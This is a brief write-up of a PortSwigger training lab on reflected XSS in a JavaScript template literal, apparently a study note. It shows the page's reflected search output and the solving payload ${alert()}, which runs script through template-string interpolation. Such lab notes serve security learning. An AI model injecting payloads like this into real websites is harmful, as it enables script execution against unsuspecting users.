# Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

```bash
# Search

abc1234

<script>
var message = `0 search results for 'abc1234'`;
document.getElementById('searchMessage').innerText = message;
</script>
```

```bash
var message = `0 search results for 'abc1234'`;

# This is a template string created with backticks `.
# ${var} will be replaced by the releveant JavaScript code when it is inside template string. 

# Search

${alert()}
```
